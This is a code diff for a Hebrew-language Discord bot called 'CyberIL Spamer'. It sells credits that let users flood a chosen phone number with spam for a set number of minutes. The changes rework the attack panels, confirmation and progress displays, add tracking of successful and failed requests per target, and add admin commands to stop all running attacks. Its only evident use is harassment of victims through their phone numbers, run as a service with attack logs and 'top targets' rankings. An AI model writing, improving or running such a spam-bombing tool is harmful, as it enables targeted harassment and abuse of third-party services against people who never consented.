+            if isinstance(r, Exception):
+                continue
+            elif isinstance(r, tuple):
+                if len(r) == 3:
+                    ok, name, reason = r
+                    if ok:
+                        success += 1
+                    else:
+                        failed.append(f"{name} ({reason})")
+                else:
+                    ok, name = r
+                    if ok:
+                        success += 1
+                    else:
+                        failed.append(name)
+                        
+        for r in atmos_call:
+            if isinstance(r, Exception):
+                continue
+            elif isinstance(r, tuple):
+                if len(r) == 3:
+                    ok, name, reason = r
+                    if ok:
+                        success += 1
+                    else:
+                        failed.append(f"{name} ({reason})")
+                else:
+                    ok, name = r
+                    if ok:
+                        success += 1
+                    else:
+                        failed.append(name)
+
+        return success, failed
 
 def create_panel():
-    embed = discord.Embed(title="", description="", color=COLOR_ACCENT)
-    embed.set_author(name="CYBERIL SPAMER")
-    embed.add_field(name="╭───────────────╮", value="", inline=False)
-    embed.add_field(name="│  🚀 START", value="│  לחץ על הכפתור למטה", inline=False)
-    embed.add_field(name="│  💎 CREDITS", value=f"│  כל קרדיט = דקה אחת", inline=False)
-    embed.add_field(name="│  ⏱️ COOLDOWN", value=f"│  {COOLDOWN_TIME} שניות", inline=False)
-    embed.add_field(name="│  📊 STATUS", value="│  מערכת פעילה", inline=False)
-    embed.add_field(name="╰───────────────╯", value="", inline=False)
-    embed.set_footer(text=f"© CYBERIL • {datetime.now().strftime('%d/%m/%Y')}")
+    embed = discord.Embed(
+        title="**CYBERIL SPAMER**",
+        description="```המערכת המובילה בישראל```",
+        color=COLOR_MAIN
+    )
+    embed.add_field(
+        name="**איך מתחילים?**",
+        value="```1. לחץ על התחל ספאם\n2. הזן מספר טלפון\n3. בחר כמות קרדיטים\n4. אשר והמתן```",
+        inline=False
+    )
+    embed.add_field(
+        name="**עלות**",
+        value=f"```כל קרדיט = דקה אחת של ספאם```",
+        inline=False
+    )
+    embed.add_field(
+        name="**הערות**",
+        value=f"```דיליי של {COOLDOWN_TIME} שניות בין ספאם לאותו מספר```",
+        inline=False
+    )
+    embed.set_footer(text=f"CyberIL Spamer © 2026")
     return embed
 
 def create_gift_panel():
-    embed = discord.Embed(title="", description="", color=0xFFD700)
-    embed.set_author(name="FREE CREDITS")
-    embed.add_field(name="╭───────────────╮", value="", inline=False)
-    embed.add_field(name="│  🎁 CLAIM", value="│  קרדיט אחד כל 24 שעות", inline=False)
-    embed.add_field(name="│  💎 REWARD", value="│  +1 קרדיט", inline=False)
-    embed.add_field(name="╰───────────────╯", value="", inline=False)
-    embed.set_footer(text=f"© CYBERIL • {datetime.now().strftime('%d/%m/%Y')}")
+    embed = discord.Embed(
+        title="**קרדיטים חינם**",
+        description="```קבל קרדיט אחד כל 24 שעות```",
+        color=0xFFD700
+    )
+    embed.add_field(
+        name="**איך מקבלים?**",
+        value="```לחץ על הכפתור למטה```",
+        inline=False
+    )
+    embed.set_footer(text="CyberIL Spamer © 2026")
     return embed
 
 class StopAttack(discord.ui.View):
@@ -408,7 +1243,7 @@ class StopAttack(discord.ui.View):
         super().__init__(timeout=None)
         self.user_id = user_id
 
-    @discord.ui.button(label="⏹️ עצור", style=discord.ButtonStyle.danger, custom_id="stop_attack")
+    @discord.ui.button(label="עצור ספאם", style=discord.ButtonStyle.danger, emoji="🛑", custom_id="stop_attack")
     async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id != self.user_id and not is_admin(interaction):
             await interaction.response.send_message("❌ לא הספאם שלך", ephemeral=True)
@@ -427,7 +1262,7 @@ class ConfirmAttack(discord.ui.View):
         self.user_id = user_id
         self.is_running = False
 
-    @discord.ui.button(label="✅ אישור", style=discord.ButtonStyle.success, custom_id="confirm_attack")
+    @discord.ui.button(label="✅ כן, התחל ספאם", style=discord.ButtonStyle.danger, emoji="✅", custom_id="confirm_attack")
     async def confirm_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id != self.user_id:
             await interaction.response.send_message("❌ לא האישור שלך", ephemeral=True)
@@ -438,21 +1273,24 @@ class ConfirmAttack(discord.ui.View):
             return
         
         self.is_running = True
+        self.stop()
+        
         await interaction.response.defer(ephemeral=True)
         
         for _ in range(self.cost):
             if not await use_credit(self.user_id):
-                embed = discord.Embed(title="❌ שגיאה", description="אין מספיק קרדיטים", color=COLOR_DANGER)
+                embed = discord.Embed(title="❌ אין מספיק קרדיטים", color=COLOR_DANGER)
                 await interaction.edit_original_response(embed=embed, view=None)
                 return
 
         event = asyncio.Event()
         active_missions[self.user_id] = event
 
-        embed = discord.Embed(title="🔄 ספאם בתהליך", description=f"**יעד:** {self.phone}\n**זמן:** {self.cost} דקות", color=COLOR_WARNING)
+        embed = discord.Embed(title="🔄 ספאם בתהליך", description=f"מספמם את **{self.phone}**\nזמן: ~{self.cost} דקות", color=COLOR_WARNING)
         await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
 
         total_success = 0
+        total_failed = 0
         start_time = time.time()
         end_time = start_time + (self.cost * 60)
         last_update = time.time()
@@ -462,14 +1300,15 @@ class ConfirmAttack(discord.ui.View):
                 if event.is_set():
                     break
                 
-                success = await run_single_batch(self.phone)
-                total_success += success
+                s, f = await run_all(self.phone)
+                total_success += s
+                total_failed += f
                 
                 if time.time() - last_update >= 3:
-                    remaining = max(0, int((end_time - time.time()) / 60))
+                    remaining = int((end_time - time.time()) / 60)
                     embed = discord.Embed(
                         title="🔄 ספאם בתהליך",
-                        description=f"**יעד:** {self.phone}\n**נותר:** {remaining} דקות\n\n**✅ בקשות שנשלחו:** {total_success}",
+                        description=f"מספמם את **{self.phone}**\nנותר: ~{remaining} דקות\n\n✅ הצלחות: {total_success}\n❌ כשלונות: {total_failed}",
                         color=COLOR_WARNING
                     )
                     await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
@@ -485,30 +1324,31 @@ class ConfirmAttack(discord.ui.View):
                 phone=self.phone,
                 cost=self.cost,
                 success=total_success,
-                failed=0,
+                failed=total_failed,
                 duration=self.cost * 60
             )
 
             bal = await format_balance(self.user_id)
             
             if stopped:
-                embed = discord.Embed(title="⏹️ ספאם הופסק", color=COLOR_WARNING)
+                final = discord.Embed(title="⏹️ ספאם הופסק", color=COLOR_WARNING)
             else:
-                embed = discord.Embed(title="✅ ספאם הושלם", color=COLOR_SUCCESS)
+                final = discord.Embed(title="✅ ספאם הושלם", color=COLOR_SUCCESS)
             
-            embed.add_field(name="📱 יעד", value=self.phone, inline=True)
-            embed.add_field(name="⏱️ משך", value=f"{self.cost} דקות", inline=True)
-            embed.add_field(name="💎 קרדיטים", value=bal, inline=True)
-            embed.add_field(name="📨 בקשות", value=str(total_success), inline=True)
+            final.add_field(name="📱 יעד", value=self.phone, inline=True)
+            final.add_field(name="⏱️ משך", value=f"~{self.cost} דקות", inline=True)
+            final.add_field(name="✅ הצלחות", value=str(total_success), inline=True)
+            final.add_field(name="❌ כשלונות", value=str(total_failed), inline=True)
+            final.add_field(name="💎 קרדיטים נותרים", value=bal, inline=True)
             
-            await interaction.edit_original_response(embed=embed, view=None)
+            await interaction.edit_original_response(embed=final, view=None)
 
         except Exception as e:
             active_missions.pop(self.user_id, None)
-            embed = discord.Embed(title="❌ שגיאה", description=str(e)[:180], color=COLOR_DANGER)
-            await interaction.edit_original_response(embed=embed, view=None)
+            error_embed = discord.Embed(title="❌ שגיאה", description=str(e)[:180], color=COLOR_DANGER)
+            await interaction.edit_original_response(embed=error_embed, view=None)
 
-    @discord.ui.button(label="❌ ביטול", style=discord.ButtonStyle.secondary, custom_id="cancel_attack")
+    @discord.ui.button(label="❌ בטל", style=discord.ButtonStyle.secondary, emoji="❌", custom_id="cancel_attack")
     async def cancel_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id != self.user_id:
             await interaction.response.send_message("❌ לא שלך", ephemeral=True)
@@ -518,8 +1358,8 @@ class ConfirmAttack(discord.ui.View):
         await interaction.response.edit_message(embed=embed, view=None)
 
 class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
-    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="0501234567", min_length=10, max_length=10)
-    credits = discord.ui.TextInput(label="כמות קרדיטים", placeholder="1-100", min_length=1, max_length=3)
+    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="0501234567", min_length=10, max_length=10, style=discord.TextStyle.short)
+    credits = discord.ui.TextInput(label="כמות קרדיטים", placeholder="1-100", min_length=1, max_length=3, style=discord.TextStyle.short)
 
     async def on_submit(self, interaction: discord.Interaction):
         phone_num = self.phone.value.strip()
@@ -538,6 +1378,7 @@ class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
             return
 
         uid = interaction.user.id
+
         bal = await fetch_balance(uid)
         unlimited = await has_unlimited(uid)
 
@@ -553,22 +1394,23 @@ class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
             return
 
         bal_str = await format_balance(uid)
-        embed = discord.Embed(
+        
+        confirm = discord.Embed(
             title="⚠️ אישור ספאם",
-            description=f"**יעד:** {phone_num}\n**משך:** {credits_num} דקות\n**עלות:** {credits_num} קרדיטים\n**יתרה:** {bal_str}",
+            description=f"```\nיעד: {phone_num}\nמשך: {credits_num} דקות\nעלות: {credits_num} קרדיטים\nיתרה: {bal_str}\n```",
             color=COLOR_WARNING
         )
         
         try:
-            await interaction.response.send_message(embed=embed, view=ConfirmAttack(phone=phone_num, cost=credits_num, user_id=uid), ephemeral=True)
+            await interaction.response.send_message(embed=confirm, view=ConfirmAttack(phone=phone_num, cost=credits_num, user_id=uid), ephemeral=True)
         except discord.errors.NotFound:
-            await interaction.followup.send(embed=embed, view=ConfirmAttack(phone=phone_num, cost=credits_num, user_id=uid), ephemeral=True)
+            await interaction.followup.send(embed=confirm, view=ConfirmAttack(phone=phone_num, cost=credits_num, user_id=uid), ephemeral=True)
 
 class MainPanel(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="🚀 התחל", style=discord.ButtonStyle.danger, emoji="🚀", custom_id="start_spam")
+    @discord.ui.button(label="🚀 התחל ספאם", style=discord.ButtonStyle.danger, emoji="🚀", custom_id="start_spam")
     async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         now = time.time()
         last = cooldown_tracker.get(interaction.user.id, 0)
@@ -580,16 +1422,19 @@ class MainPanel(discord.ui.View):
         cooldown_tracker[interaction.user.id] = now
         await interaction.response.send_modal(LaunchModal())
 
-    @discord.ui.button(label="💎 קרדיטים", style=discord.ButtonStyle.primary, emoji="💎", custom_id="check_balance")
+    @discord.ui.button(label="💎 הקרדיטים שלי", style=discord.ButtonStyle.primary, emoji="💎", custom_id="check_balance")
     async def balance_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         uid = interaction.user.id
         bal_str = await format_balance(uid)
         stats = await get_user_stats(uid)
 
-        embed = discord.Embed(title="💎 הקרדיטים שלי", description=f"**{bal_str}**", color=COLOR_ACCENT)
+        embed = discord.Embed(title="💎 הקרדיטים שלי", description=f"יתרה: **{bal_str}**", color=COLOR_INFO)
+        
         if stats:
-            embed.add_field(name="📊 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
+            embed.add_field(name="📊 סה\"כ מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
             embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
+            embed.add_field(name="❌ כשלונות", value=str(stats.get("total_failed", 0)), inline=True)
+
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
     @discord.ui.button(label="📊 סטטוס", style=discord.ButtonStyle.secondary, emoji="📊", custom_id="stats")
@@ -602,21 +1447,44 @@ class MainPanel(discord.ui.View):
             await interaction.followup.send(embed=embed, ephemeral=True)
             return
 
-        embed = discord.Embed(title="📊 סטטיסטיקה גלובלית", color=COLOR_ACCENT)
-        embed.add_field(name="🎯 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
+        embed = discord.Embed(title="📊 סטטיסטיקה גלובלית", color=COLOR_INFO)
+        embed.add_field(name="🎯 סה\"כ מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
         embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
-        embed.add_field(name="💎 קרדיטים", value=str(stats.get("total_cost", 0)), inline=True)
+        embed.add_field(name="💎 קרדיטים בשימוש", value=str(stats.get("total_cost", 0)), inline=True)
         embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
+        
         await interaction.followup.send(embed=embed, ephemeral=True)
+
+    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.danger, emoji="🛑", custom_id="stop_all")
+    async def stop_all_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not is_admin(interaction):
+            await interaction.response.send_message("❌ רק אדמינים יכולים לעצור את כל המתקפות", ephemeral=True)
+            return
+        
+        stopped_count = 0
+        for user_id, event in list(active_missions.items()):
+            if event and not event.is_set():
+                event.set()
+                stopped_count += 1
+        
+        active_missions.clear()
+        
+        embed = discord.Embed(
+            title="🛑 כל המתקפות הופסקו",
+            description=f"הופסקו {stopped_count} מתקפות פעילות",
+            color=COLOR_SUCCESS
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
 
 class FreeCoins(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="🎁 קבל", style=discord.ButtonStyle.success, emoji="🎁", custom_id="claim_free")
+    @discord.ui.button(label="🎁 קבל קרדיט חינם", style=discord.ButtonStyle.success, emoji="🎁", custom_id="claim_free")
     async def claim_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         uid = interaction.user.id
         now = time.time()
+        
         await interaction.response.defer(ephemeral=True)
 
         doc = await settings_collection.find_one({"_id": uid, "type": "free_credits"})
@@ -625,15 +1493,25 @@ class FreeCoins(discord.ui.View):
             if diff < 86400:
                 hours = int((86400 - diff) // 3600)
                 minutes = int(((86400 - diff) % 3600) // 60)
-                embed = discord.Embed(title="⏱️ קרדיטים חינם", description=f"תוכל לקבל קרדיט נוסף בעוד {hours} שעות ו-{minutes} דקות", color=COLOR_WARNING)
+                embed = discord.Embed(
+                    title="⏱️ קרדיטים חינם",
+                    description=f"תוכל לקבל קרדיט נוסף בעוד {hours} שעות ו-{minutes} דקות",
+                    color=COLOR_WARNING
+                )
                 await interaction.followup.send(embed=embed, ephemeral=True)
                 return
 
         await add_credits(uid, 1)
         await settings_collection.update_one({"_id": uid, "type": "free_credits"}, {"$set": {"last_claim": now}}, upsert=True)
+
         new_bal = await format_balance(uid)
         
-        embed = discord.Embed(title="🎁 קיבלת קרדיט", description=f"+1 קרדיט\n\n**יתרה:** {new_bal}", color=0xFFD700)
+        embed = discord.Embed(
+            title="🎁 קיבלת קרדיט",
+            description=f"+1 קרדיט\n\nיתרה: {new_bal}",
+            color=0xFFD700
+        )
+        
         await interaction.followup.send(embed=embed, ephemeral=True)
 
 async def get_user_stats(user_id: int):
@@ -644,6 +1522,7 @@ async def get_user_stats(user_id: int):
             "total_attacks": {"$sum": 1},
             "total_cost": {"$sum": "$cost"},
             "total_success": {"$sum": "$success_count"},
+            "total_failed": {"$sum": "$failed_count"},
         }}
     ]
     result = await logs_collection.aggregate(pipeline).to_list(1)
@@ -656,6 +1535,7 @@ async def get_global_stats():
             "total_attacks": {"$sum": 1},
             "total_cost": {"$sum": "$cost"},
             "total_success": {"$sum": "$success_count"},
+            "total_failed": {"$sum": "$failed_count"},
             "unique_users": {"$addToSet": "$user_id"}
         }}
     ]
@@ -687,7 +1567,6 @@ async def get_top_targets(limit: int = 10):
 
 @client.event
 async def on_ready():
-    # לא צריך להוסיף Views פה כי הם כבר persistent ונוספים אוטומטית כששולחים הודעה
     await tree.sync()
     print(f"✅ CyberIL Spamer פעיל → {client.user}")
     print(f"📡 מחובר ל-{len(client.guilds)} שרתים")
@@ -721,10 +1600,12 @@ async def cmd_credits(interaction: discord.Interaction, member: discord.Member =
     bal = await format_balance(target.id)
     stats = await get_user_stats(target.id)
 
-    embed = discord.Embed(title="💎 קרדיטים", description=f"{target.mention} — **{bal}**", color=COLOR_ACCENT)
+    embed = discord.Embed(title="💎 קרדיטים", description=f"{target.mention} — **{bal}**", color=COLOR_INFO)
     if stats:
         embed.add_field(name="📊 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
         embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
+        embed.add_field(name="❌ כשלונות", value=str(stats.get("total_failed", 0)), inline=True)
+
     await interaction.response.send_message(embed=embed)
 
 @tree.command(name="addcredit", description="[ADMIN] הוסף קרדיטים")
@@ -846,9 +1727,10 @@ async def cmd_mylogs(interaction: discord.Interaction):
     for log in logs:
         embed.add_field(
             name=f"{log['date']} {log['time']}",
-            value=f"📱 {log['phone']}\n✅ {log['success_count']}",
+            value=f"📱 {log['phone']}\n✅ {log['success_count']} | ❌ {log['failed_count']} | 💎 {log['cost']}",
             inline=False
         )
+
     await interaction.followup.send(embed=embed, ephemeral=True)
 
 @tree.command(name="checkstatus", description="[ADMIN] בדוק סטטוס")
@@ -859,10 +1741,13 @@ async def cmd_checkstatus(interaction: discord.Interaction):
 
     await interaction.response.defer(ephemeral=True)
     test_num = "0506500708"
-    success = await run_single_batch(test_num)
+    success, failed = await run_all(test_num)
 
     embed = discord.Embed(title="📊 בדיקת מערכת", color=COLOR_INFO)
-    embed.add_field(name="✅ בקשות שנשלחו", value=str(success), inline=True)
+    embed.add_field(name="✅ הצלחות", value=str(success), inline=True)
+    embed.add_field(name="❌ כשלונות", value=str(failed), inline=True)
+    embed.add_field(name="🔢 סה\"כ", value=str(success + failed), inline=True)
+
     await interaction.followup.send(embed=embed, ephemeral=True)
 
 @tree.command(name="attacklogs", description="[ADMIN] לוגים")
@@ -883,9 +1768,10 @@ async def cmd_attacklogs(interaction: discord.Interaction, limit: int = 10):
     for log in logs[:10]:
         embed.add_field(
             name=f"{log['username']} | {log['date']} {log['time']}",
-            value=f"📱 {log['phone']}\n✅ {log['success_count']}",
+            value=f"📱 {log['phone']}\n✅ {log['success_count']} | ❌ {log['failed_count']} | 💎 {log['cost']}",
             inline=False
         )
+
     await interaction.followup.send(embed=embed, ephemeral=True)
 
 @tree.command(name="topnumbers", description="[ADMIN] מספרים מובילים")
@@ -905,9 +1791,10 @@ async def cmd_topnumbers(interaction: discord.Interaction):
     for i, item in enumerate(top, 1):
         embed.add_field(
             name=f"{i}. {item['_id']}",
-            value=f"מתקפות: {item['count']}",
+            value=f"מתקפות: {item['count']} | הצלחות: {item['success_total']}",
             inline=False
         )
+
     await interaction.followup.send(embed=embed, ephemeral=True)
 
 @tree.command(name="globalstats", description="[ADMIN] סטטיסטיקה גלובלית")
@@ -928,7 +1815,30 @@ async def cmd_globalstats(interaction: discord.Interaction):
     embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
     embed.add_field(name="💎 קרדיטים", value=str(stats.get("total_cost", 0)), inline=True)
     embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
+    embed.add_field(name="❌ כשלונות", value=str(stats.get("total_failed", 0)), inline=True)
+
     await interaction.followup.send(embed=embed, ephemeral=True)
+
+@tree.command(name="stopall", description="[ADMIN] עצור את כל המתקפות")
+async def cmd_stopall(interaction: discord.Interaction):
+    if not is_admin(interaction):
+        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
+        return
+    
+    stopped_count = 0
+    for user_id, event in list(active_missions.items()):
+        if event and not event.is_set():
+            event.set()
+            stopped_count += 1
+    
+    active_missions.clear()
+    
+    embed = discord.Embed(
+        title="🛑 כל המתקפות הופסקו",
+        description=f"הופסקו {stopped_count} מתקפות פעילות",
+        color=COLOR_SUCCESS
+    )
+    await interaction.response.send_message(embed=embed, ephemeral=True)
 
 @tree.command(name="restart", description="[ADMIN] אתחל בוט")
 async def cmd_restart(interaction: discord.Interaction):
